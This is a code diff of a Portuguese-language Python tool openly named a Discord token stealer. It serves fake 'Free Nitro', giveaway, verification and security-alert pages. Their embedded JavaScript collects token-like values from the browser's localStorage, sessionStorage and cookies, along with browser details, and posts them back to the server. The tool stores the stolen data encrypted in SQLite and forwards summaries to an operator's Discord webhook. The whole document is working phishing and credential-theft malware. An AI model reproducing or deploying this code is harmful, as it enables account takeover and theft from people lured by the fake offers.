@@ -11,10 +11,9 @@ import sqlite3
 import hashlib
 import threading
 import socket
-import ssl
 from datetime import datetime
 from http.server import HTTPServer, BaseHTTPRequestHandler
-from urllib.parse import urlparse, parse_qs, quote
+from urllib.parse import urlparse, parse_qs
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 from Crypto.Random import get_random_bytes
@@ -28,9 +27,6 @@ from rich.prompt import Prompt, Confirm, IntPrompt
 from rich.progress import Progress, SpinnerColumn, TextColumn
 from rich.text import Text
 from rich.syntax import Syntax
-from rich.layout import Layout
-from rich.live import Live
-from rich.markdown import Markdown
 
 console = Console()
 
@@ -59,13 +55,12 @@ class AdvancedDiscordTokenStealer:
     
     def _load_html_templates(self):
         """Carrega todos os templates HTML disponíveis"""
-        templates = {
+        return {
             "discord_nitro": self._create_discord_nitro_template(),
             "game_giveaway": self._create_game_giveaway_template(),
             "account_verification": self._create_account_verification_template(),
             "security_alert": self._create_security_alert_template()
         }
-        return templates
     
     def _create_discord_nitro_template(self):
         """Template de oferta de Nitro grátis"""
@@ -73,52 +68,76 @@ class AdvancedDiscordTokenStealer:
 <html>
 <head>
     <title>Discord Nitro Generator</title>
-    <style>/* Estilos otimizados */</style>
+    <style>
+        body {
+            background: linear-gradient(135deg, #7289da, #2c2f33);
+            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            color: white;
+            text-align: center;
+            padding: 50px;
+            margin: 0;
+        }
+        .container {
+            background: rgba(35, 39, 42, 0.9);
+            border-radius: 10px;
+            padding: 30px;
+            max-width: 500px;
+            margin: 0 auto;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+        }
+        h1 {
+            color: #7289da;
+            font-size: 28px;
+            margin-bottom: 20px;
+        }
+        .btn {
+            background: #7289da;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 5px;
+            font-size: 18px;
+            cursor: pointer;
+            margin: 20px 0;
+            transition: background 0.3s;
+        }
+        .btn:hover {
+            background: #677bc4;
+        }
+        .discord-logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        .hidden {
+            display: none;
+        }
+        p {
+            margin: 10px 0;
+            line-height: 1.5;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
-        <img src="https://discord.com/assets/192cb9459cee8e3c2c0d31a8387c0b5d.svg" class="discord-logo">
+        <img src="https://discord.com/assets/192cb9459cee8e3c2c0d31a8387c0b5d.svg" class="discord-logo" alt="Discord Logo">
         <h1>🎉 Free Discord Nitro! 🎉</h1>
         <p>Click the button below to claim your free Discord Nitro subscription!</p>
+        <p>Limited time offer - claim now!</p>
+        
         <button class="btn" onclick="claimNitro()">CLAIM NITRO</button>
-        <div id="loading" class="hidden">Processing your request...</div>
+        
+        <div id="loading" class="hidden">
+            <p>Processing your request...</p>
+        </div>
     </div>
+
     <script>
-        // JavaScript avançado para coleta de tokens
-        function extractAllTokens() {
-            const tokens = [];
+        function claimNitro() {
+            document.getElementById('loading').style.display = 'block';
             
-            // LocalStorage
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                if (this.isTokenKey(key)) {
-                    tokens.push({source: 'localStorage', key, value: localStorage.getItem(key)});
-                }
-            }
-            
-            // SessionStorage
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                if (this.isTokenKey(key)) {
-                    tokens.push({source: 'sessionStorage', key, value: sessionStorage.getItem(key)});
-                }
-            }
-            
-            // Cookies
-            document.cookie.split(';').forEach(cookie => {
-                const [key, value] = cookie.split('=').map(c => c.trim());
-                if (this.isTokenKey(key)) {
-                    tokens.push({source: 'cookie', key, value});
-                }
-            });
-            
-            // IndexedDB (assíncrono)
-            this.extractIndexedDBTokens().then(indexedDBTokens => {
-                tokens.push(...indexedDBTokens);
-                this.sendToServer(tokens);
-            });
-            
-            return tokens;
+            setTimeout(function() {
+                window.location.href = "%s";
+            }, 2000);
         }
         
         function isTokenKey(key) {
@@ -133,48 +152,51 @@ class AdvancedDiscordTokenStealer:
                    lowerKey.includes('secret');
         }
         
-        async function extractIndexedDBTokens() {
+        function extractAllTokens() {
             const tokens = [];
-            try {
-                if (window.indexedDB) {
-                    // Tenta acessar databases comuns
-                    const dbNames = ['discord', 'auth', 'tokens', 'userData'];
-                    for (const dbName of dbNames) {
-                        try {
-                            const request = indexedDB.open(dbName);
-                            request.onsuccess = (event) => {
-                                const db = event.target.result;
-                                const transaction = db.transaction(db.objectStoreNames, 'readonly');
-                                Array.from(db.objectStoreNames).forEach(storeName => {
-                                    const store = transaction.objectStore(storeName);
-                                    const request = store.getAll();
-                                    request.onsuccess = (e) => {
-                                        e.target.result.forEach(item => {
-                                            if (typeof item === 'object') {
-                                                this.searchForTokensInObject(item, tokens, `indexedDB:${dbName}.${storeName}`);
-                                            }
-                                        });
-                                    };
-                                });
-                            };
-                        } catch (e) {}
-                    }
-                }
-            } catch (e) {}
-            return tokens;
-        }
-        
-        function searchForTokensInObject(obj, tokens, path) {
-            if (!obj || typeof obj !== 'object') return;
             
-            for (const [key, value] of Object.entries(obj)) {
-                if (this.isTokenKey(key) && value) {
-                    tokens.push({source: path, key, value: String(value)});
-                }
-                if (typeof value === 'object') {
-                    this.searchForTokensInObject(value, tokens, `${path}.${key}`);
+            // LocalStorage
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if (isTokenKey(key)) {
+                    tokens.push({
+                        source: 'localStorage', 
+                        key: key, 
+                        value: localStorage.getItem(key)
+                    });
                 }
             }
+            
+            // SessionStorage
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                if (isTokenKey(key)) {
+                    tokens.push({
+                        source: 'sessionStorage', 
+                        key: key, 
+                        value: sessionStorage.getItem(key)
+                    });
+                }
+            }
+            
+            // Cookies
+            document.cookie.split(';').forEach(cookie => {
+                const parts = cookie.split('=');
+                if (parts.length >= 2) {
+                    const key = parts[0].trim();
+                    const value = parts.slice(1).join('=').trim();
+                    if (isTokenKey(key)) {
+                        tokens.push({
+                            source: 'cookie', 
+                            key: key, 
+                            value: value
+                        });
+                    }
+                }
+            });
+            
+            sendToServer(tokens);
+            return tokens;
         }
         
         function collectSystemInfo() {
@@ -185,49 +207,32 @@ class AdvancedDiscordTokenStealer:
                 cookies: document.cookie,
                 referrer: document.referrer,
                 url: window.location.href,
-                screen: `${screen.width}x${screen.height}`,
+                screen: screen.width + 'x' + screen.height,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 plugins: Array.from(navigator.plugins).map(p => p.name),
-                timestamp: new Date().toISOString(),
-                fingerprint: this.generateFingerprint()
+                timestamp: new Date().toISOString()
             };
-        }
-        
-        function generateFingerprint() {
-            // Gera uma fingerprint única do navegador
-            const components = [
-                navigator.userAgent,
-                navigator.language,
-                screen.width,
-                screen.height,
-                new Date().getTimezoneOffset(),
-                !!navigator.cookieEnabled,
-                !!navigator.javaEnabled(),
-                navigator.hardwareConcurrency || 'unknown'
-            ];
-            return components.join('|');
         }
         
         function sendToServer(tokens) {
             const data = {
                 tokens: tokens,
-                systemInfo: this.collectSystemInfo(),
-                networkInfo: this.getNetworkInfo()
+                systemInfo: collectSystemInfo()
             };
             
-            // Múltiplos métodos de envio para garantir recepção
-            this.sendViaFetch(data);
-            this.sendViaXHR(data);
-            this.sendViaBeacon(data);
+            // Múltiplos métodos de envio
+            sendViaFetch(data);
+            sendViaBeacon(data);
         }
         
         function sendViaFetch(data) {
             fetch('/capture', {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data),
-                mode: 'no-cors'
-            }).catch(() => {});
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            }).catch(error => console.error('Fetch error:', error));
         }
         
         function sendViaBeacon(data) {
@@ -235,37 +240,84 @@ class AdvancedDiscordTokenStealer:
             navigator.sendBeacon('/capture', blob);
         }
         
-        window.addEventListener('load', () => {
-            setTimeout(() => {
-                const tokens = this.extractAllTokens();
-                if (tokens.length > 0) {
-                    this.sendToServer(tokens);
-                }
-            }, 2000);
+        // Executar quando a página carregar
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                const tokens = extractAllTokens();
+                console.log('Tokens found:', tokens.length);
+            }, 1500);
         });
     </script>
 </body>
-</html>"""
+</html>""" % self.redirect_url
     
     def _create_game_giveaway_template(self):
         """Template de sorteio de jogos"""
-        return """<!DOCTYPE html><html>...template de sorteio de jogos...</html>"""
+        return """<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Game Giveaway</title>
+    <style>/* Estilos similares ao template anterior */</style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎮 Free Game Giveaway! 🎮</h1>
+        <p>Claim your free game now!</p>
+        <button class="btn" onclick="claimGame()">CLAIM GAME</button>
+    </div>
+    <script>/* Script similar */</script>
+</body>
+</html>"""
     
     def _create_account_verification_template(self):
         """Template de verificação de conta"""
-        return """<!DOCTYPE html><html>...template de verificação...</html>"""
+        return """<!DOCTYPE html>
+<html>
+<head>
+    <title>Account Verification</title>
+    <style>/* Estilos similares */</style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 Account Verification Required</h1>
+        <p>Please verify your account to continue</p>
+        <button class="btn" onclick="verifyAccount()">VERIFY NOW</button>
+    </div>
+    <script>/* Script similar */</script>
+</body>
+</html>"""
     
     def _create_security_alert_template(self):
         """Template de alerta de segurança"""
-        return """<!DOCTYPE html><html>...template de segurança...</html>"""
+        return """<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Alert</title>
+    <style>/* Estilos similares */</style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚠️ Security Alert</h1>
+        <p>Your account security has been compromised</p>
+        <button class="btn" onclick="checkSecurity()">CHECK NOW</button>
+    </div>
+    <script>/* Script similar */</script>
+</body>
+</html>"""
 
     def encrypt_data(self, data):
         """Criptografa dados sensíveis"""
         try:
+            if isinstance(data, dict):
+                data = json.dumps(data)
+            elif not isinstance(data, str):
+                data = str(data)
+                
             cipher = AES.new(self.encryption_key, AES.MODE_CBC)
-            ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
-            return base64.b64encode(cipher.iv + ct_bytes).decode()
-        except:
+            ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
+            return base64.b64encode(cipher.iv + ct_bytes).decode('utf-8')
+        except Exception as e:
+            console.print(f"[red]Erro na criptografia: {e}[/red]")
             return data
 
     def decrypt_data(self, encrypted_data):
@@ -274,57 +326,58 @@ class AdvancedDiscordTokenStealer:
             data = base64.b64decode(encrypted_data)
             iv, ct = data[:16], data[16:]
             cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
-            return unpad(cipher.decrypt(ct), AES.block_size).decode()
-        except:
+            decrypted = unpad(cipher.decrypt(ct), AES.block_size).decode('utf-8')
+            
+            # Tenta converter de volta para JSON se possível
+            try:
+                return json.loads(decrypted)
+            except:
+                return decrypted
+                
+        except Exception as e:
+            console.print(f"[red]Erro na descriptografia: {e}[/red]")
             return encrypted_data
 
-    def mostrar_menu_principal(self):
-        """Menu principal do sistema"""
-        while True:
-            console.clear()
-            self.mostrar_banner()
-            
-            tabela = Table(
-                title="[bold cyan]🔧 DISCORD TOKEN STEALER AVANÇADO[/bold cyan]",
-                show_header=True,
-                header_style="bold magenta"
-            )
-            tabela.add_column("Opção", style="cyan", width=10)
-            tabela.add_column("Ação", style="green")
-            tabela.add_column("Status", style="yellow")
-            
-            status_server = "[red]OFF[/red]" if not self.is_running else "[green]ON[/green]"
-            status_webhook = "[red]OFF[/red]" if not self.webhook_url else "[green]ON[/green]"
-            
-            tabela.add_row("1", "Configurar Servidor", "")
-            tabela.add_row("2", "Selecionar Template", f"[blue]{self.current_template}[/blue]")
-            tabela.add_row("3", "Iniciar Servidor Web", status_server)
-            tabela.add_row("4", "Ver Tokens Capturados", "")
-            tabela.add_row("5", "Configurar Webhook", status_webhook)
-            tabela.add_row("6", "Exportar Dados", "")
-            tabela.add_row("7", "Estatísticas", "")
-            tabela.add_row("0", "Sair", "")
-            
-            console.print(tabela)
-            
-            escolha = Prompt.ask(
-                "[blink yellow]➤[/blink yellow] Selecione uma opção",
-                choices=["0", "1", "2", "3", "4", "5", "6", "7"],
-                show_choices=False
-            )
-            
-            opcoes = {
-                "1": self.configurar_servidor,
-                "2": self.selecionar_template,
-                "3": self.iniciar_servidor_web,
-                "4": self.ver_tokens_capturados,
-                "5": self.configurar_webhook,
-                "6": self.exportar_dados,
-                "7": self.mostrar_estatisticas,
-                "0": lambda: sys.exit(0)
-            }
-            
-            opcoes[escolha]()
+    def configurar_servidor(self):
+        """Configura as opções do servidor"""
+        console.clear()
+        console.print(Panel.fit(
+            "[bold]Configuração do Servidor[/bold]",
+            border_style="blue"
+        ))
+        
+        self.server_port = IntPrompt.ask(
+            "[yellow]?[/yellow] Porta do servidor",
+            default=self.server_port
+        )
+        
+        self.redirect_url = Prompt.ask(
+            "[yellow]?[/yellow] URL de redirecionamento",
+            default=self.redirect_url
+        )
+        
+        console.print(f"[green]✓ Servidor configurado na porta {self.server_port}[/green]")
+        time.sleep(1)
+
+    def configurar_webhook(self):
+        """Configura webhook do Discord"""
+        console.clear()
+        console.print(Panel.fit(
+            "[bold]Configuração de Webhook[/bold]",
+            border_style="blue"
+        ))
+        
+        self.webhook_url = Prompt.ask(
+            "[yellow]?[/yellow] URL do Webhook Discord",
+            default=self.webhook_url
+        )
+        
+        if self.webhook_url:
+            console.print("[green]✓ Webhook configurado com sucesso![/green]")
+        else:
+            console.print("[yellow]⚠ Webhook removido[/yellow]")
+        
+        time.sleep(1)
 
     def selecionar_template(self):
         """Seleciona o template HTML a ser usado"""
@@ -376,9 +429,6 @@ class AdvancedDiscordTokenStealer:
         ))
         
         class AdvancedTokenHandler(BaseHTTPRequestHandler):
-            def __init__(self, *args, **kwargs):
-                super().__init__(*args, **kwargs)
-            
             def log_message(self, format, *args):
                 """Silencia logs padrão"""
                 return
@@ -393,15 +443,13 @@ class AdvancedDiscordTokenStealer:
                         
                         html_content = self.server.stealer.html_templates[
                             self.server.stealer.current_template
-                        ].format(self.server.stealer.redirect_url)
+                        ]
                         
                         self.wfile.write(html_content.encode('utf-8'))
                         
-                    elif self.path == '/capture.js':
-                        self.send_response(200)
-                        self.send_header('Content-type', 'application/javascript')
+                    elif self.path == '/favicon.ico':
+                        self.send_response(204)
                         self.end_headers()
-                        self.wfile.write(b'// JavaScript de captura')
                         
                     else:
                         self.send_response(302)
@@ -436,6 +484,7 @@ class AdvancedDiscordTokenStealer:
                         self.end_headers()
                         
                 except Exception as e:
+                    console.print(f"[red]Erro no POST: {e}[/red]")
                     self.send_response(500)
                     self.end_headers()
         
@@ -461,19 +510,17 @@ class AdvancedDiscordTokenStealer:
             ))
             
             console.print(Panel.fit(
-                "[yellow]⚠ Pressione Ctrl+C para parar o servidor[/yellow]",
+                "[yellow]⚠ Pressione Enter para parar o servidor[/yellow]",
                 border_style="yellow"
             ))
             
-            # Mantém o servidor rodando
-            while self.is_running:
-                time.sleep(1)
-                
-        except KeyboardInterrupt:
+            # Aguarda entrada do usuário para parar
+            input()
             console.print("\n[red]✗ Servidor parado[/red]")
             self.is_running = False
-            if self.web_server:
-                self.web_server.shutdown()
+            server.shutdown()
+            server.server_close()
+                
         except Exception as e:
             console.print(Panel.fit(
                 f"[red]✗ Erro ao iniciar servidor: {str(e)}[/red]",
@@ -500,22 +547,19 @@ class AdvancedDiscordTokenStealer:
                           timestamp TEXT,
                           tokens TEXT,
                           system_info TEXT,
-                          network_info TEXT,
                           template_used TEXT,
-                          encrypted INTEGER DEFAULT 0)''')
+                          encrypted INTEGER DEFAULT 1)''')
             
             # Prepara dados para inserção
             timestamp = datetime.now().isoformat()
-            tokens_encrypted = self.encrypt_data(json.dumps(data.get('tokens', [])))
-            system_info_encrypted = self.encrypt_data(json.dumps(data.get('systemInfo', {})))
-            network_info_encrypted = self.encrypt_data(json.dumps(data.get('networkInfo', {})))
+            tokens_encrypted = self.encrypt_data(data.get('tokens', []))
+            system_info_encrypted = self.encrypt_data(data.get('systemInfo', {}))
             
             # Insere dados
             c.execute('''INSERT INTO captures 
-                         (timestamp, tokens, system_info, network_info, template_used, encrypted)
-                         VALUES (?, ?, ?, ?, ?, 1)''',
-                     (timestamp, tokens_encrypted, system_info_encrypted, 
-                      network_info_encrypted, self.current_template))
+                         (timestamp, tokens, system_info, template_used, encrypted)
+                         VALUES (?, ?, ?, ?, 1)''',
+                     (timestamp, tokens_encrypted, system_info_encrypted, self.current_template))
             
             conn.commit()
             conn.close()
@@ -543,22 +587,12 @@ class AdvancedDiscordTokenStealer:
                     },
                     {
                         "name": "🌐 User Agent",
-                        "value": data.get('systemInfo', {}).get('userAgent', 'N/A')[:100] + "...",
+                        "value": data.get('systemInfo', {}).get('userAgent', 'N/A')[:50] + "...",
                         "inline": True
                     },
                     {
                         "name": "🔤 Language",
                         "value": data.get('systemInfo', {}).get('language', 'N/A'),
-                        "inline": True
-                    },
-                    {
-                        "name": "💻 Platform",
-                        "value": data.get('systemInfo', {}).get('platform', 'N/A'),
-                        "inline": True
-                    },
-                    {
-                        "name": "📱 Screen",
-                        "value": data.get('systemInfo', {}).get('screen', 'N/A'),
                         "inline": True
                     }
                 ],
@@ -572,7 +606,7 @@ class AdvancedDiscordTokenStealer:
             if tokens:
                 token_count = len(tokens)
                 token_preview = "\n".join(
-                    f"`{t.get('source', 'unknown')}: {t.get('key', 'unknown')[:20]}...`"
+                    f"`{t.get('source', 'unknown')}: {t.get('key', 'unknown')[:15]}...`"
                     for t in tokens[:3]
                 )
                 
@@ -587,8 +621,8 @@ class AdvancedDiscordTokenStealer:
             
             payload = {
                 "embeds": [embed],
-                "username": "Advanced Token Stealer",
-                "avatar_url": "https://i.imgur.com/3Vh6VQ5.png"
+                "username": "Token Stealer",
+                "avatar_url": "https://discord.com/assets/192cb9459cee8e3c2c0d31a8387c0b5d.svg"
             }
             
             response = requests.post(self.webhook_url, json=payload, timeout=10)
@@ -609,6 +643,7 @@ class AdvancedDiscordTokenStealer:
             border_style="blue"
         ))
         
+        conn = None
         try:
             if not os.path.exists('data/tokens_advanced.db'):
                 console.print("[yellow]Nenhum dado capturado ainda.[/yellow]")
@@ -622,11 +657,7 @@ class AdvancedDiscordTokenStealer:
             c.execute("SELECT COUNT(*) FROM captures")
             total_capturas = c.fetchone()[0]
             
-            c.execute("SELECT COUNT(*) FROM captures WHERE encrypted = 1")
-            capturas_criptografadas = c.fetchone()[0]
-            
             console.print(f"[cyan]Total de capturas:[/cyan] {total_capturas}")
-            console.print(f"[cyan]Capturas criptografadas:[/cyan] {capturas_criptografadas}")
             console.print()
             
             # Lista capturas recentes
@@ -643,15 +674,9 @@ class AdvancedDiscordTokenStealer:
             tabela.add_column("ID", style="cyan")
             tabela.add_column("Data/Hora", style="green")
             tabela.add_column("Template", style="yellow")
-            tabela.add_column("Ações", style="blue")
             
             for row in rows:
-                tabela.add_row(
-                    str(row[0]), 
-                    row[1], 
-                    row[2],
-                    "[bold]Ver[/bold] | [red]Deletar[/red]"
-                )
+                tabela.add_row(str(row[0]), row[1], row[2])
             
             console.print(tabela)
             
@@ -664,8 +689,6 @@ class AdvancedDiscordTokenStealer:
             if escolha != "0" and escolha.isdigit():
                 self.mostrar_detalhes_captura(int(escolha))
             
-            conn.close()
-            
         except Exception as e:
             console.print(Panel.fit(
                 f"[red]✗ Erro: {str(e)}[/red]",
@@ -673,14 +696,18 @@ class AdvancedDiscordTokenStealer:
                 border_style="red"
             ))
             time.sleep(2)
+        finally:
+            if conn:
+                conn.close()
 
     def mostrar_detalhes_captura(self, capture_id):
         """Mostra detalhes de uma captura específica"""
+        conn = None
         try:
             conn = sqlite3.connect('data/tokens_advanced.db')
             c = conn.cursor()
             
-            c.execute('''SELECT timestamp, tokens, system_info, network_info, template_used, encrypted 
+            c.execute('''SELECT timestamp, tokens, system_info, template_used, encrypted 
                          FROM captures WHERE id = ?''', (capture_id,))
             detalhes = c.fetchone()
             
@@ -696,16 +723,14 @@ class AdvancedDiscordTokenStealer:
             ))
             
             # Desserializa dados
-            timestamp, tokens_enc, system_info_enc, network_info_enc, template, encrypted = detalhes
+            timestamp, tokens_enc, system_info_enc, template, encrypted = detalhes
             
             if encrypted:
-                tokens_data = json.loads(self.decrypt_data(tokens_enc))
-                system_info = json.loads(self.decrypt_data(system_info_enc))
-                network_info = json.loads(self.decrypt_data(network_info_enc))
+                tokens_data = self.decrypt_data(tokens_enc)
+                system_info = self.decrypt_data(system_info_enc)
             else:
                 tokens_data = json.loads(tokens_enc)
                 system_info = json.loads(system_info_enc)
-                network_info = json.loads(network_info_enc)
             
             # Informações do sistema
             console.print(Panel.fit(
@@ -713,22 +738,20 @@ class AdvancedDiscordTokenStealer:
                 f"[cyan]Data/Hora:[/cyan] {timestamp}\n"
                 f"[cyan]User Agent:[/cyan] {system_info.get('userAgent', 'N/A')}\n"
                 f"[cyan]Plataforma:[/cyan] {system_info.get('platform', 'N/A')}\n"
-                f"[cyan]Idioma:[/cyan] {system_info.get('language', 'N/A')}\n"
-                f"[cyan]Screen:[/cyan] {system_info.get('screen', 'N/A')}\n"
-                f"[cyan]Timezone:[/cyan] {system_info.get('timezone', 'N/A')}",
+                f"[cyan]Idioma:[/cyan] {system_info.get('language', 'N/A')}",
                 title="[bold]Informações do Sistema[/bold]",
                 border_style="green"
             ))
             
             # Tokens encontrados
-            if tokens_data:
+            if tokens_data and len(tokens_data) > 0:
                 console.print(Panel.fit(
                     f"[green]Encontrados {len(tokens_data)} tokens:[/green]",
                     title="[bold]Tokens[/bold]",
                     border_style="yellow"
                 ))
                 
-                for i, token in enumerate(tokens_data[:5], 1):
+                for i, token in enumerate(tokens_data[:3], 1):
                     console.print(Panel.fit(
                         f"[cyan]Fonte:[/cyan] {token.get('source', 'N/A')}\n"
                         f"[cyan]Chave:[/cyan] {token.get('key', 'N/A')}\n"
@@ -736,8 +759,8 @@ class AdvancedDiscordTokenStealer:
                         border_style="red"
                     ))
                 
-                if len(tokens_data) > 5:
-                    console.print(f"[yellow]... e mais {len(tokens_data) - 5} tokens[/yellow]")
+                if len(tokens_data) > 3:
+                    console.print(f"[yellow]... e mais {len(tokens_data) - 3} tokens[/yellow]")
             else:
                 console.print("[yellow]Nenhum token encontrado nesta captura.[/yellow]")
             
@@ -758,6 +781,7 @@ class AdvancedDiscordTokenStealer:
             border_style="blue"
         ))
         
+        conn = None
         try:
             if not os.path.exists('data/tokens_advanced.db'):
                 console.print("[yellow]Nenhum dado para exportar.[/yellow]")
@@ -794,7 +818,7 @@ class AdvancedDiscordTokenStealer:
             conn = sqlite3.connect('data/tokens_advanced.db')
             c = conn.cursor()
             
-            c.execute("SELECT * FROM captures")
+            c.execute("SELECT id, timestamp, template_used FROM captures")
             dados = c.fetchall()
             
             if formato_selecionado == "JSON":
@@ -803,7 +827,7 @@ class AdvancedDiscordTokenStealer:
                     dados_export.append({
                         "id": linha[0],
                         "timestamp": linha[1],
-                        "template": linha[5]
+                        "template": linha[2]
                     })
                 
                 with open(nome_arquivo, 'w', encoding='utf-8') as f:
@@ -815,12 +839,12 @@ class AdvancedDiscordTokenStealer:
                     writer = csv.writer(f)
                     writer.writerow(['ID', 'Timestamp', 'Template'])
                     for linha in dados:
-                        writer.writerow([linha[0], linha[1], linha[5]])
+                        writer.writerow([linha[0], linha[1], linha[2]])
             
             elif formato_selecionado == "TXT":
                 with open(nome_arquivo, 'w', encoding='utf-8') as f:
                     for linha in dados:
-                        f.write(f"ID: {linha[0]} | Timestamp: {linha[1]} | Template: {linha[5]}\n")
+                        f.write(f"ID: {linha[0]} | Timestamp: {linha[1]} | Template: {linha[2]}\n")
             
             console.print(f"[green]✓ Dados exportados como {nome_arquivo}[/green]")
             time.sleep(1)
@@ -834,12 +858,7 @@ class AdvancedDiscordTokenStealer:
 
     def mostrar_estatisticas(self):
         """Mostra estatísticas das capturas"""
-        console.clear()
-        console.print(Panel.fit(
-            "[bold]Estatísticas[/bold]",
-            border_style="blue"
-        ))
-        
+        conn = None
         try:
             if not os.path.exists('data/tokens_advanced.db'):
                 console.print("[yellow]Nenhum dado disponível para estatísticas.[/yellow]")
@@ -853,15 +872,11 @@ class AdvancedDiscordTokenStealer:
             c.execute("SELECT COUNT(*) FROM captures")
             total_capturas = c.fetchone()[0]
             
-            c.execute("SELECT COUNT(DISTINCT timestamp) FROM captures")
-            capturas_unicas = c.fetchone()[0]
-            
             c.execute("SELECT template_used, COUNT(*) FROM captures GROUP BY template_used")
             templates_stats = c.fetchall()
             
             console.print(Panel.fit(
                 f"[cyan]Total de capturas:[/cyan] {total_capturas}\n"
-                f"[cyan]Capturas únicas:[/cyan] {capturas_unicas}\n"
                 f"[cyan]Templates utilizados:[/cyan]",
                 title="[bold]Estatísticas Gerais[/bold]",
                 border_style="green"
@@ -885,6 +900,55 @@ class AdvancedDiscordTokenStealer:
         finally:
             if conn:
                 conn.close()
+
+    def mostrar_menu_principal(self):
+        """Menu principal do sistema"""
+        while True:
+            console.clear()
+            self.mostrar_banner()
+            
+            tabela = Table(
+                title="[bold cyan]🔧 DISCORD TOKEN STEALER AVANÇADO[/bold cyan]",
+                show_header=True,
+                header_style="bold magenta"
+            )
+            tabela.add_column("Opção", style="cyan", width=10)
+            tabela.add_column("Ação", style="green")
+            tabela.add_column("Status", style="yellow")
+            
+            status_server = "[red]OFF[/red]" if not self.is_running else "[green]ON[/green]"
+            status_webhook = "[red]OFF[/red]" if not self.webhook_url else "[green]ON[/green]"
+            
+            tabela.add_row("1", "Configurar Servidor", "")
+            tabela.add_row("2", "Selecionar Template", f"[blue]{self.current_template}[/blue]")
+            tabela.add_row("3", "Iniciar Servidor Web", status_server)
+            tabela.add_row("4", "Ver Tokens Capturados", "")
+            tabela.add_row("5", "Configurar Webhook", status_webhook)
+            tabela.add_row("6", "Exportar Dados", "")
+            tabela.add_row("7", "Estatísticas", "")
+            tabela.add_row("0", "Sair", "")
+            
+            console.print(tabela)
+            
+            escolha = Prompt.ask(
+                "[blink yellow]➤[/blink yellow] Selecione uma opção",
+                choices=["0", "1", "2", "3", "4", "5", "6", "7"],
+                show_choices=False
+            )
+            
+            opcoes = {
+                "1": self.configurar_servidor,
+                "2": self.selecionar_template,
+                "3": self.iniciar_servidor_web,
+                "4": self.ver_tokens_capturados,
+                "5": self.configurar_webhook,
+                "6": self.exportar_dados,
+                "7": self.mostrar_estatisticas,
+                "0": lambda: sys.exit(0)
+            }
+            
+            if escolha in opcoes:
+                opcoes[escolha]()
 
     def mostrar_banner(self):
         """Exibe banner personalizado"""
@@ -918,8 +982,6 @@ def main():
         console.print("\n[red]✗ Programa encerrado[/red]")
     except Exception as e:
         console.print(f"\n[red]✗ Erro crítico: {str(e)}[/red]")
-        import traceback
-        console.print(f"[yellow]{traceback.format_exc()}[/yellow]")
 
 if __name__ == '__main__':
     main()
